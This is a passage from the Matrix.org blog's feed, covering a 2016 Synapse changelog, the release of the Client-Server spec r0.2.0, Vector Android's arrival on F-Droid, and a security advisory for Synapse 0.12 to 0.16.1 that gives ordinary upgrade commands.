 	&lt;li&gt;Add purge_media_cache admin API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;902&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;902&quot; data-id=&quot;162932471&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#902&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add deactivate account admin API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;903&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;903&quot; data-id=&quot;163182922&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#903&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add optional pepper to password hashing (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;907&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;907&quot; data-id=&quot;163714838&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#907&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;910&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;910&quot; data-id=&quot;164027482&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#910&lt;&#x2F;a&gt; by &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;KentShikama&quot;&gt;@KentShikama&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add an admin option to shared secret registration (breaks backwards compat) (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;909&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;909&quot; data-id=&quot;163892610&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#909&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add purge local room history API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;911&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;911&quot; data-id=&quot;164096726&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#911&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;923&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;923&quot; data-id=&quot;165745465&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#923&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;924&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;924&quot; data-id=&quot;165785903&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#924&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add requestToken endpoints (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;915&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;915&quot; data-id=&quot;164571236&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#915&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add an &#x2F;account&#x2F;deactivate endpoint (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;921&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;921&quot; data-id=&quot;165511431&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#921&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add filter param to &#x2F;messages. Add &#x27;contains_url&#x27; to filter. (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;922&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;922&quot; data-id=&quot;165585706&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#922&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add device_id support to &#x2F;login (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;929&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;929&quot; data-id=&quot;166118756&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#929&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add device_id support to &#x2F;v2&#x2F;register flow. (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;937&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;937&quot; data-id=&quot;166613208&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#937&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;942&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;942&quot; data-id=&quot;166788540&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#942&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add GET &#x2F;devices endpoint (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;939&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;939&quot; data-id=&quot;166614282&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#939&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;944&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;944&quot; data-id=&quot;166840622&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#944&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add GET &#x2F;device&#x2F;{&#x27;{&#x27;}deviceId{&#x27;{&#x27;} (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;943&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;943&quot; data-id=&quot;166792610&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#943&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add update and delete APIs for devices (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;949&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;949&quot; data-id=&quot;167421787&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#949&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Rewrite LDAP Authentication against ldap3 (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;843&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;843&quot; data-id=&quot;158692541&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#843&lt;&#x2F;a&gt; by &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mweinelt&quot;&gt;@mweinelt&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Linearize some federation endpoints based on (origin, room_id) (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;879&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;879&quot; data-id=&quot;160917868&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#879&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Remove the legacy v0 content upload API. (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;888&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;888&quot; data-id=&quot;161405539&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#888&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Use similar naming we use in email notifs for push (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;894&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;894&quot; data-id=&quot;162121552&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#894&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Optionally include password hash in createUser endpoint (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;905&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;905&quot; data-id=&quot;163548694&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#905&lt;&#x2F;a&gt; by &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;KentShikama&quot;&gt;@KentShikama&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Use a query that postgresql optimises better for get_events_around (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;906&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;906&quot; data-id=&quot;163691925&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#906&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fall back to &#x27;username&#x27; if &#x27;user&#x27; is not given for appservice registration. (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;927&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;927&quot; data-id=&quot;165932125&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#927&lt;&#x2F;a&gt; by &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&quot;&gt;@Half-Shot&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add metrics for psutil derived memory usage (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;936&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;936&quot; data-id=&quot;166605269&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#936&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Record device_id in client_ips (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;938&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;938&quot; data-id=&quot;166613664&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#938&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Send the correct host header when fetching keys (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;941&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;941&quot; data-id=&quot;166784788&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#941&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Log the hostname the reCAPTCHA was completed on (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;946&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;946&quot; data-id=&quot;167078376&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#946&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Make the device id on e2e key upload optional (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;956&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;956&quot; data-id=&quot;167831954&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#956&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add r0.2.0 to the &quot;supported versions&quot; list (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;960&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;960&quot; data-id=&quot;168038168&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#960&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Don&#x27;t include name of room for invites in push (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;961&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;961&quot; data-id=&quot;168050327&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#961&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix substitution failure in mail template (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;887&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;887&quot; data-id=&quot;161403101&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#887&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Put most recent 20 messages in email notif (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;892&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;892&quot; data-id=&quot;161732391&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#892&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Ensure that the guest user is in the database when upgrading accounts (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Ensure that the guest user is in the database when upgrading accounts&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;914&quot; data-id=&quot;164541872&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#914&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix various edge cases in auth handling (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;919&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;919&quot; data-id=&quot;165306219&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#919&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix 500 ISE when sending alias event without a state_key (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;925&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;925&quot; data-id=&quot;165844030&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#925&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where we stored rejections in the state_group, persist all rejections (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;948&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;948&quot; data-id=&quot;167391758&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#948&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix lack of check of if the user is banned when handling 3pid invites (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;952&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;952&quot; data-id=&quot;167640958&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#952&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix a couple of bugs in the transaction and keyring code (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;954&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;954&quot; data-id=&quot;167675906&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#954&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;955&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;955&quot; data-id=&quot;167810557&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#955&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Client-Server spec r0.2.0 released</title>
        <published>2016-07-14T00:00:00+00:00</published>
        <updated>2016-07-14T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/07/14/client-server-spec-r0-2-0-released/" type="text/html"/>
        <id>https://matrix.org/blog/2016/07/14/client-server-spec-r0-2-0-released/</id>
        
        <content type="html">&lt;p&gt;We&#x27;ve just released &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;client_server&#x2F;r0.2.0.html&quot;&gt;r0.2.0 of the Client-Server API specification&lt;&#x2F;a&gt;. This release bundles up a number of clarifications and incremental improvements, as well as removing some outdated text relating to the pre-r0 event syncing APIs.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also taken the opportunity to make the license on the specifications &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;intro.html#license&quot;&gt;explicit&lt;&#x2F;a&gt; (we&#x27;re using the Apache license), and have finally settled a long-running argument on &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;intro.html#user-identifiers&quot;&gt;what a user ID should look like&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As ever, the evolution of the spec has been helped tremendously by contributions and bug reports from the members of community - thanks to all those who have helped it on its way!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Vector Android now also on F-Droid</title>
        <published>2016-07-13T00:00:00+00:00</published>
        <updated>2016-07-13T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/07/13/vector-android-now-also-on-f-droid/" type="text/html"/>
        <id>https://matrix.org/blog/2016/07/13/vector-android-now-also-on-f-droid/</id>
        
        <content type="html">&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;07&#x2F;V.png&quot; alt=&quot;Vector&quot; width=&quot;20%&quot; height=&quot;20%&quot; class=&quot;alignleft size-full wp-image-1698&quot; &#x2F;&gt; Vector Android has been added to the &lt;a href=&quot;https:&#x2F;&#x2F;f-droid.org&#x2F;repository&#x2F;browse&#x2F;?fdid=im.vector.alpha&quot;&gt;F-Droid catalogue&lt;&#x2F;a&gt;. F-Droid is an installable catalogue of FOSS (Free and Open Source Software) applications for the Android platform. Many people have asked or requested Vector to be added to F-Droid, so we are happy to be able to announce its inclusion.&lt;&#x2F;p&gt;
&lt;p&gt;In order to meet the requirements for F-Droid, the build is not using GCM (Google Cloud Messaging) for notifications - instead it will keep syncing in the background. If you find that the ongoing background sync is using too much battery, you can add a delay or change the timeout of the sync - or even disable background sync completely - in the settings page.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, if you have feedback on any of the Vector clients, there is &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#vector-feedback:matrix.org&quot;&gt;#vector-feedback:matrix.org&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Critical security vulnerability in Synapse 0.12 to 0.16.1 inclusive</title>
        <published>2016-07-08T00:00:00+00:00</published>
        <updated>2016-07-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/07/08/critical-security-vulnerability-in-synapse-0-12-to-0-16-1-inclusive/" type="text/html"/>
        <id>https://matrix.org/blog/2016/07/08/critical-security-vulnerability-in-synapse-0-12-to-0-16-1-inclusive/</id>
        
        <content type="html">&lt;p&gt;We&#x27;ve been made aware of a critical security issue in Synapse present in versions 0.12 through 0.16.1 inclusive which can allow users&#x27; accounts to be accessed by other unauthorized users on the same server. The issue was reported at 14:40 UTC on 2016-07-07 by Patrik Oldsberg at Ericsson (many thanks Patrik for discovering the issue and swiftly informing us). The source of the issue was identified, and a patch was created and distributed to package maintainers at roughly 16:30 UTC the same day.&lt;&#x2F;p&gt;
&lt;p&gt;We are not aware of any exploit in the wild, but it is critical for all synapse homeservers later than v0.12 to be upgraded immediately.&lt;&#x2F;p&gt;
&lt;p&gt;The github repository, as well as major 3rd party packages, have been updated with patched versions.&lt;&#x2F;p&gt;
&lt;p&gt;If an update is not available for your system you should manually apply the security patch that is included below. (This can be done by running &lt;code&gt;patch -p1 sec.patch&lt;&#x2F;code&gt; in the synapse source directory.)&lt;&#x2F;p&gt;
&lt;p&gt;The git commit SHA of the fix is: 067596d341a661e008195f7f3a6887ade7cafa32. This is included in release v0.16.1-r1.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst Synapse (and Matrix) is still in beta, we nonetheless take such security issues seriously. In the coming days we will be reviewing how this vulnerability was introduced, and any steps that could have been taken to prevent the issue. We will also be auditing the remaining access control system to ensure there are no other existing issues. The full findings will be published when completed.&lt;&#x2F;p&gt;
&lt;p&gt;We apologise for the inconvenience of this emergency upgrade.&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your continued support,
The Matrix Team&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Various upgrade instructions:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;If you installed via git: &lt;code&gt;git pull&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
 	&lt;li&gt;If you installed via pip: &lt;code&gt;pip install https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tarball&#x2F;master&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;If you installed via debian package: &lt;code&gt;apt-get update; apt-get install matrix-synapse&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
After upgrade you will need to restart synapse.
&lt;p&gt;Links to 3rd party packages:
Arch: &lt;a href=&quot;https:&#x2F;&#x2F;aur.archlinux.org&#x2F;packages&#x2F;matrix-synapse&quot;&gt;https:&#x2F;&#x2F;aur.archlinux.org&#x2F;packages&#x2F;matrix-synapse&lt;&#x2F;a&gt;
Fedora: &lt;a href=&quot;https:&#x2F;&#x2F;obs.infoserver.lv&#x2F;project&#x2F;show&#x2F;matrix-synapse&quot;&gt;https:&#x2F;&#x2F;obs.infoserver.lv&#x2F;project&#x2F;show&#x2F;matrix-synapse&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
